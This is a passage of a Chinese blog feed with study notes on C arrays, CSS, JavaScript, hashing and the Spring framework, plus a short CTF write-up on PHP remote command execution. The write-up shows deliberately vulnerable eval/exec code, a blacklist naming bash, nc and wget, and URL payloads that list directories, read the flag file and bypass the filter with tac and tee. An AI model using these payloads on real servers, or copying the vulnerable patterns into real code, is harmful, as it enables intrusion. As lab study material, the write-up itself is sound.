    <content type="html"><![CDATA[<h2 id="1-task1-数组"><a href="#1-task1-数组" class="headerlink" title="1.task1-数组"></a>1.task1-数组</h2><h3 id="ex1"><a href="#ex1" class="headerlink" title="ex1."></a>ex1.</h3><pre><code>char a[2][3] = &#123;&#123;'a', 'b', 'c'&#125;, &#123;'1', '\0', '2'&#125;&#125;;printf(&quot;%s&quot;, a[0]);</code></pre><p>试问打印的结果是什么：</p><p>首先我们要知道<code>%s</code>是字符串，那么a[0]应该是要输出全部数据，也就是<code>a,b,c,1,\0,2</code></p><p>但是<code>\0</code>是转义字符是字符串的结束标志，所以我们最终的输出结果是<code>a,b,c,1</code></p><p>或者会问：</p><p>在C语言中，顺序存储长度为3的字符串，需要占用（）个字节。</p><p>首先明确 一个char是一个字节，最后字符串会有一个<code>\0</code>作为结束，所以是4个字节</p><h3 id="ex2"><a href="#ex2" class="headerlink" title="ex2."></a>ex2.</h3><pre><code>int a[] = &#123;1, 2, 3, 4, 5, 6, 7, 8&#125;;char s = &#39;a&#39;, e, i;</code></pre><p>我们如果想得到a[4]=&gt;5怎么办</p><p>首先想到的是ascll码</p><p>使用a[‘e’-‘s’]，而’a’在这个题中是<code>char s</code></p><p>所以可以写成<code>a[&#39;e&#39;-s]</code></p><h3 id="ex3"><a href="#ex3" class="headerlink" title="ex3."></a>ex3.</h3><p>数组A=array[1..100，1..100]以行序为主序存储，设每个数据元素占2个存储单元，基地址为10，则LOC[5，5]应为。</p><p>这个可以代表二维数组计数从1 开始，也就是4行4列的数据</p><p><code>10+[4*100+4]*2</code>为818</p><h2 id="2-task2-css"><a href="#2-task2-css" class="headerlink" title="2.task2-css"></a>2.task2-css</h2><h3 id="ex1-1"><a href="#ex1-1" class="headerlink" title="ex1."></a>ex1.</h3><p>有关css的优先级</p><p>可以把样式的应用方式分为几个等级，按照等级来计算权重</p><p>1、!important，加在样式属性值后，权重值为 10000<br>2、内联样式，如：style=””，权重值为1000<br>3、ID选择器，如：#content，权重值为100<br>4、类，伪类和属性选择器，如： content、:hover 权重值为10<br>5、标签选择器和伪元素选择器，如：div、p、:before 权重值为1</p><p>6、通用选择器（*）、子选择器（&gt;）、相邻选择器（+）、同胞选择器（~）、权重值为0</p><p>而去css优先级有这样一个规定：<code>越具体优先级越高</code>（#username &gt; span #username）</p><p><strong>另外子选择器<code>&gt;</code>必须是<code>亲儿子</code></strong></p><h3 id="ex2-1"><a href="#ex2-1" class="headerlink" title="ex2."></a>ex2.</h3><p>一些css3的东西</p><p>1.<code>display: flex;</code>:弹性布局</p><p>​    最常用的做法就是将所有<strong>子盒子</strong>都变成行内块元素</p><p>可以在一行显示</p><p>2.<code>line-height: 120rpx;</code>:行高</p><p>​    就是一行文本框的高度，通过调节修改文字的上下位置</p><p>3.<code>overflow: hidden;</code>:消除子元素浮动或者溢出隐藏</p><p>4.<code>letter-spacing: 40rpx;</code>:用于调节单个字间距</p><p>5.<code>flex-wrap: wrap;</code>:对于flex之后的盒子使用</p><p>​    开启自动换行，因为flex之后不会换行，wrap会根据页面宽度进行换行</p><p>6.<code>justify-content: space-between;</code>:贴边对齐</p><p>​    常用与两个盒子并排，一个需要向左对齐，一个需要向右对齐</p><p>7.<code>box-sizing</code>:调节盒子类型</p><p>​    有两个取值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">box-sizing: content-box; /*默认值*/</span><br><span class="line">box-sizing: border-box;</span><br></pre></td></tr></table></figure><p>content-box：我们设置的宽度是多宽盒子就多宽，然后<strong>padding和border会撑大盒子</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">width = content-width;</span><br><span class="line">height = content-height;</span><br></pre></td></tr></table></figure><p>border-box:相当于计算了border以内的所有宽度，调节<strong>padding和border不会撑大我们的盒子</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">width = content-width + padding-left + padding-right + border-left-width + border-right-width;</span><br><span class="line">height = content-height + padding-top + padding-bottom + border-top-height + border-bottom-height;</span><br></pre></td></tr></table></figure><p>8.<code>flex-direction: column;</code></p><p>灵活的项目将垂直显示，正如一个列一样。</p><h2 id="3-task3-js"><a href="#3-task3-js" class="headerlink" title="3.task3-js"></a>3.task3-js</h2><h3 id="ex1-数组的map方法"><a href="#ex1-数组的map方法" class="headerlink" title="ex1.数组的map方法"></a>ex1.数组的map方法</h3><p>js数组中有一个map方法，多用于提取对象数组中特定的值，可以看成一个for循环</p><p>语法: array.map( function ( item, index, arr) {} )</p><p>第一个参数:item,必须,当前元素的值</p><p>第二个参数:index,可选,当前元素在数组中的索引值</p><p>第三个参数:arr,当前元素属于的数组对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//提取details数组中的img_url属性</span><br><span class="line">const urls = this.details.map(item =&gt; &#123;</span><br><span class="line">return item.img_url</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="4-task4-算法"><a href="#4-task4-算法" class="headerlink" title="4.task4-算法"></a>4.task4-算法</h2><h3 id="ex1-哈希表-链地址法"><a href="#ex1-哈希表-链地址法" class="headerlink" title="ex1.哈希表-链地址法"></a>ex1.哈希表-链地址法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">设哈希表长为8，哈希函数为Hash (key)=key%7。初始记录关键字序列为(32，24，15，27，20，13)，用链地址法作为解决冲突方法的平均查找长度是？</span><br></pre></td></tr></table></figure><p>首先根据<code>hash(key)=key%7</code>，那么关键字序列就得到了<code>(4,3,1,6,6,6)</code>，链表法是将重复的key插入在相同的key后面形成一个链表，每一次查找都需要遍历完整个链表。</p><p>所以查找长度：4x1+1x2+1x3</p><p>平均查找长度再除以一个6 得到1.5</p>]]></content>
    
    
    
    <tags>
      
      <tag>exercise</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web安全</title>
    <link href="/2022/09/19/web%E5%AE%89%E5%85%A8/"/>
    <url>/2022/09/19/web%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="web安全"><a href="#web安全" class="headerlink" title="web安全"></a>web安全</h1><p>先记录一点基本的题目</p><h2 id="1-基本题目"><a href="#1-基本题目" class="headerlink" title="1.基本题目"></a>1.基本题目</h2><h3 id="1-1-rce"><a href="#1-1-rce" class="headerlink" title="1.1 rce"></a>1.1 rce</h3><p>RCE英文全称：remote command/code execute<br>分为远程命令执行ping和远程代码执行evel。<br>漏洞出现的原因：没有在输入口做输入处理。</p><p>像这样的：就是一个典型的rce问题，使用了eval函数（eval — 把字符串作为PHP代码执行）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))//isset判断get参数的位置是否有url这个参数</span><br><span class="line">&#123;</span><br><span class="line">eval($_GET[&#x27;url&#x27;]);//如果有就直接执行url中的代码</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这时我们在参数栏中使用<code>system()</code>执行代码，ls代表展示文件列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=system(ls);</span><br></pre></td></tr></table></figure><p>我们发现显示了<code>index.php</code>这个页面</p><p>然后使用：进入主目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=system(%22ls%20/%22);</span><br></pre></td></tr></table></figure><p>得到一串代码：中间有一段乱码</p><p><code>bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</code></p><p>使用cat命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=system(%27cat%20/flllllaaaaaaggggggg%27);</span><br></pre></td></tr></table></figure><p>拿到flag</p><h3 id="1-2finalrce"><a href="#1-2finalrce" class="headerlink" title="1.2finalrce"></a>1.2finalrce</h3><p>可以看到过滤了很多东西</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">  $url=$_GET[&#x27;url&#x27;];</span><br><span class="line">  if(preg_match(&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;,$url))</span><br><span class="line">  &#123;</span><br><span class="line">    echo &quot;Sorry,you can&#x27;t use this.&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    echo &quot;Can you see anything?&quot;;</span><br><span class="line">    exec($url);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里要用到<code> command | tee file.txt</code>这个linux命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=l\s%20/%20|%20tee%201.txt</span><br></pre></td></tr></table></figure><p>然后进入1.txt看到乱码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flllllaaaaaaggggggg</span><br></pre></td></tr></table></figure><p>再进行tac和tee（tac命令用于将文件以行为单位的反序输出，即第一行最后显示，最后一行先显示。tac实际上是cat反过来写。）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?tac%20/flllllaaaaaaggggggg%20|%20tee%202.txt</span><br></pre></td></tr></table></figure><p>然后进入2.txt拿到flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spring</title>
    <link href="/2022/09/13/Spring/"/>
    <url>/2022/09/13/Spring/</url>
    
    <content type="html"><![CDATA[<h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><h2 id="1-Spring-Framework"><a href="#1-Spring-Framework" class="headerlink" title="1.Spring Framework"></a>1.Spring Framework</h2><h3 id="1-1-Framework的体系结构"><a href="#1-1-Framework的体系结构" class="headerlink" title="1.1 Framework的体系结构"></a>1.1 Framework的体系结构</h3><p>我们这里介绍的是Spring4.0的体系结构</p><p>从底层的核心容器（管理对象）开始向上搭建</p><p><img src="https://img-blog.csdnimg.cn/ddc99f8b58b44c4ea42f29ddca52cbe1.png" alt="farmework体系结构"></p><h3 id="1-2-核心概念"><a href="#1-2-核心概念" class="headerlink" title="1.2 核心概念"></a>1.2 核心概念</h3><p>IoC：为了解耦而提出的方案（控制反转）</p><p><img src="https://img-blog.csdnimg.cn/758fe91bb7204080a6e09205f149202a.png" alt="ioc"></p><p>不再new产生，而是使用IoC容器中的创建好的对象，将对象统一放入IoC容器中进行管理，并对于有依赖关系的对象提供DI</p><p>原本的<code>priavte BookDao bookDao = new BookImp()</code> 变成了 <code>private BookDao bookDao</code></p><p>而IoC容器中被管理的对象被称为<code>bean</code></p><p>DI：依赖注入</p><p>对bean与bean之间建立依赖关系，叫做依赖注入</p><p>也是为了充分解耦而创建</p><p>达到的效果就是获取IoC容器中的bean时，可以一起提取相关的对应关系</p><h3 id="1-3入门案例"><a href="#1-3入门案例" class="headerlink" title="1.3入门案例"></a>1.3入门案例</h3><p>IoC：</p><p>我们首先导入Spring</p><p>在<code>pom.xml</code>中依赖中写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;5.2.10.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>然后在resource下新建spring的config文件-<code>applicationContext.xml</code></p><p>然后在创建的配置文件下写入bean对应的class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--2.配置bean--&gt;</span><br><span class="line">&lt;!--bean标签标示配置bean</span><br><span class="line">id属性标示给bean起名字</span><br><span class="line">class属性表示给bean定义类型--&gt;</span><br><span class="line">&lt;bean id=&quot;bookDao&quot; class=&quot;com.itheima.dao.impl.BookDaoImpl&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;bean id=&quot;bookService&quot; class=&quot;com.itheima.service.impl.BookServiceImpl&quot;&gt;</span><br></pre></td></tr></table></figure><p>然后我们建立一个主方法</p><p>获取IoC容器，容器的类型是一个接口叫做<code>ApplicationContext</code>，我们new它的实现类<code>ClassPathXmlApplicationContext</code>，里面传递的参数是我们resource中配置spring文件的名称<code>applicationContext.xml</code></p><p>调用getBean拿到Bean，然后使用对象中的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//3.获取IoC容器</span><br><span class="line">ApplicationContext ctx = new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;);</span><br><span class="line">//4.获取bean（根据bean配置id获取）</span><br><span class="line">BookDao bookDao = (BookDao) ctx.getBean(&quot;bookDao&quot;);</span><br><span class="line">bookDao.save();</span><br></pre></td></tr></table></figure><p>DI：</p><p>我们在service（另一个class文件）中要获取另一个bean中的对象</p><p>首先删除new替换为set方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//5.删除业务层中使用new的方式创建的dao对象</span><br><span class="line">private BookDao bookDao;</span><br><span class="line"></span><br><span class="line">public void save() &#123;</span><br><span class="line">    System.out.println(&quot;book service save ...&quot;);</span><br><span class="line">    bookDao.save();</span><br><span class="line">&#125;</span><br><span class="line">//6.提供对应的set方法</span><br><span class="line">public void setBookDao(BookDao bookDao) &#123;</span><br><span class="line">    this.bookDao = bookDao;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在<code>applicationContext.xml</code>文件中，为了实现将dao对象放入service中：</p><p>其中name是被引入的对象在service中的名称，ref是该对象在bean中的id或者name（编程中我们一般统一）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;bookService&quot; class=&quot;com.itheima.service.impl.BookServiceImpl&quot;&gt;</span><br><span class="line">    &lt;!--7.配置server与dao的关系--&gt;</span><br><span class="line">    &lt;!--property标签表示配置当前bean的属性</span><br><span class="line">    name属性表示配置哪一个具体的属性</span><br><span class="line">    ref属性表示参照哪一个bean--&gt;</span><br><span class="line">    &lt;property name=&quot;bookDao&quot; ref=&quot;bookDao&quot;/&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure><h3 id="1-4-bean"><a href="#1-4-bean" class="headerlink" title="1.4 bean"></a>1.4 bean</h3><h4 id="1-4-1-基础配置"><a href="#1-4-1-基础配置" class="headerlink" title="1.4.1 基础配置"></a>1.4.1 基础配置</h4><p>bean中可以使用name给bean起别名</p><p>别名可以有多个使用 空格，逗号和分号进行分隔</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;bookDao&quot; name=&quot;Dao1,Dao2&quot; class=&quot;com.itheima.dao.impl.BookDaoImpl&quot;/&gt;</span><br></pre></td></tr></table></figure><p>另外，bean为我们创建的对象默认是单一的，调用多次getBean得到的其实是同一个对象</p><p>如果我们想获得多个对象</p><p>就需要在bean中添加配置 prototype是不同的对象；singleton是默认的，为同一个对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;bookDao&quot; class=&quot;com.itheima.dao.impl.BookDaoImpl&quot; scope=&quot;prototype&quot;/&gt;</span><br></pre></td></tr></table></figure><p>但一般我们使用都是单一对象，因为方便进行快捷管理</p><p>但如果对象的状态经常变化，那我们就不能生成单一对象了，简单来说就不交给bean管理</p><p><img src="https://img-blog.csdnimg.cn/ce9544cba8c347488e1fad780266e630.png" alt="bean作用范围"></p><h4 id="1-4-2-bean实例化"><a href="#1-4-2-bean实例化" class="headerlink" title="1.4.2 bean实例化"></a>1.4.2 bean实例化</h4><p>1.构造方法</p><p>我们对于接口实例化建立构造方法的时候，构造方法是通过反射实现的（private也会调用）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class BookDaoImpl implements BookDao &#123;</span><br><span class="line"></span><br><span class="line">    private BookDaoImpl() &#123;</span><br><span class="line">        System.out.println(&quot;book dao constructor is running ....&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void save() &#123;</span><br><span class="line">        System.out.println(&quot;book dao save ...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//此时也能运行得到 book dao constructor is running ....</span><br></pre></td></tr></table></figure><p>但是如果加入了参数</p><p><code> pubilc BookDaoImpl(int i)</code>，就会报错</p><p>说明spring创建bean的时候调用的是无参的构造方法时</p><p>2.静态工厂实例化</p><p>工厂代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class OrderDaoFactory &#123;</span><br><span class="line">    public static OrderDao getOrderDao()&#123;</span><br><span class="line">        System.out.println(&quot;factory setup....&quot;);</span><br><span class="line">        return new OrderDaoImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过工厂写bean：因为构造出来的是一个<code>factory</code>对象，我们要获得<code>OrderDao</code>对象就需要调用工厂中的<code>getOrderDao</code>方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    &lt;!--方式二：使用静态工厂实例化bean--&gt;</span><br><span class="line">&lt;bean id=&quot;orderDao&quot; class=&quot;com.itheima.factory.OrderDaoFactory&quot; factory-method=&quot;getOrderDao&quot;/&gt;</span><br></pre></td></tr></table></figure><p>这样运行得到的结果，既执行了dao的代码也执行了工厂中的代码</p><p>但是现在这种方式使用的不多了</p><p>3.实例工厂实例化</p><p>通过实例工厂建立对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//实例工厂创建对象</span><br><span class="line">public class UserDaoFactory &#123;</span><br><span class="line">    public UserDao getUserDao()&#123;</span><br><span class="line">        return new UserDaoImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>bean中需要通过工厂对象再得到dao对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    &lt;!--方式三：使用实例工厂实例化bean--&gt;</span><br><span class="line">&lt;bean id=&quot;userFactory&quot; class=&quot;com.itheima.factory.UserDaoFactory&quot;/&gt;</span><br><span class="line">    &lt;!--实例工厂获取对象，使用factory-bean获取工厂对象 factory-method获取工厂中创建对象的方法--&gt;</span><br><span class="line">&lt;bean id=&quot;userDao&quot; factory-method=&quot;getUserDao&quot; factory-bean=&quot;userFactory&quot;/&gt;</span><br></pre></td></tr></table></figure><p>但是我们发现工厂对象创建出来没有用处，只是为了单纯的得到dao对象而放入bean中</p><p>4.通过factoryBean泛型实例化</p><p>实际上是对第4种方式的优化</p><p>在这个UserDaoFactoryBean中实现这个泛型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//FactoryBean创建对象</span><br><span class="line">public class UserDaoFactoryBean implements FactoryBean&lt;UserDao&gt; &#123;</span><br><span class="line">    //代替原始实例工厂中创建对象的方法</span><br><span class="line">    public UserDao getObject() throws Exception &#123;</span><br><span class="line">        return new UserDaoImpl();</span><br><span class="line">    &#125;</span><br><span class="line">//写出返回类型</span><br><span class="line">    public Class&lt;?&gt; getObjectType() &#123;</span><br><span class="line">        return UserDao.class;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //设置是否单例，默认为单例，return false关闭单例</span><br><span class="line">    public boolean isSingleton() &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在bean中，我们的代码得到了简化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--方式四：使用FactoryBean实例化bean--&gt;</span><br><span class="line">&lt;bean id=&quot;userDao&quot; class=&quot;com.itheima.factory.UserDaoFactoryBean&quot;/&gt;</span><br></pre></td></tr></table></figure><h4 id="1-4-3-bean的生命周期"><a href="#1-4-3-bean的生命周期" class="headerlink" title="1.4.3 bean的生命周期"></a>1.4.3 bean的生命周期</h4><p>在dao中写两个方法代表初始化和销毁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public class BookDaoImpl implements BookDao &#123;</span><br><span class="line">    public void save() &#123;</span><br><span class="line">        System.out.println(&quot;book dao save ...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    //表示bean初始化对应的操作</span><br><span class="line">    public void init()&#123;</span><br><span class="line">        System.out.println(&quot;init...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    //表示bean销毁前对应的操作</span><br><span class="line">    public void destory()&#123;</span><br><span class="line">        System.out.println(&quot;destory...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是现在这两个方法不会执行，所以我们需要在IoC中配置一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--init-method：设置bean初始化生命周期回调函数--&gt;</span><br><span class="line">&lt;!--destroy-method：设置bean销毁生命周期回调函数，仅适用于单例对象--&gt;</span><br><span class="line">&lt;bean id=&quot;bookDao&quot; class=&quot;com.itheima.dao.impl.BookDaoImpl&quot; init-method=&quot;init&quot; destroy-method=&quot;destory&quot;/&gt;</span><br></pre></td></tr></table></figure><p>在主函数中初始化和销毁（close），但是<code>ApplicationContext</code>没有close方法，只有它的子类<code>ClassPathXmlApplicationContext</code>有close方法，所以我们使用<code>ClassPathXmlApplicationContext</code>，构建ctx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public static void main( String[] args ) &#123;</span><br><span class="line">    ClassPathXmlApplicationContext ctx = new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;);</span><br><span class="line"></span><br><span class="line">    BookDao bookDao = (BookDao) ctx.getBean(&quot;bookDao&quot;);</span><br><span class="line">    bookDao.save();</span><br><span class="line">    //注册关闭钩子函数，在虚拟机退出之前回调此函数，关闭容器</span><br><span class="line">    //ctx.registerShutdownHook();</span><br><span class="line">    //关闭容器</span><br><span class="line">    ctx.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除了使用close方法，我们还可以注册钩子函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//注册关闭钩子函数，在虚拟机退出之前回调此函数，关闭容器</span><br><span class="line">ctx.registerShutdownHook();</span><br></pre></td></tr></table></figure><p>也可以达到触达<code>destroy</code>的效果</p><p>还可以使用接口控制，我们这里拿service举例，直接<code>implements</code>两个接口，两个接口各对应了一个方法</p><p>但是时间顺序：<strong>setBookDao&gt;afterPropertiesSet</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public class BookServiceImpl implements BookService, InitializingBean, DisposableBean &#123;</span><br><span class="line">    private BookDao bookDao;</span><br><span class="line"></span><br><span class="line">    public void setBookDao(BookDao bookDao) &#123;</span><br><span class="line">        System.out.println(&quot;set .....&quot;);</span><br><span class="line">        this.bookDao = bookDao;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void save() &#123;</span><br><span class="line">        System.out.println(&quot;book service save ...&quot;);</span><br><span class="line">        bookDao.save();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">//destroy</span><br><span class="line">    public void destroy() throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;service destroy&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">///init</span><br><span class="line">    public void afterPropertiesSet() throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;service init&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于bean的生命周期我们还要了解</p><p>第一步是相当于new对象，然后执行构造方法</p><p>set操作在init之前，也就是依赖注入等在init之前就触发的原因</p><p>初始化容器部分，是一个一个bean执行的，也就是上一个bean的初始化方法执行完之后下一个bean才开始内存分配</p><p><img src="https://img-blog.csdnimg.cn/1f42e7dd06094ac985d68741ff4ce196.png" alt="bean的生命周期"></p><h4 id="1-4-4-setter注入"><a href="#1-4-4-setter注入" class="headerlink" title="1.4.4 setter注入"></a>1.4.4 setter注入</h4><p>我们在前面了解了bean setter注入的一种方式，引用注入</p><p>对引用数据类型使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//6.提供对应的set方法</span><br><span class="line">public void setBookDao(BookDao bookDao) &#123;</span><br><span class="line">    this.bookDao = bookDao;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 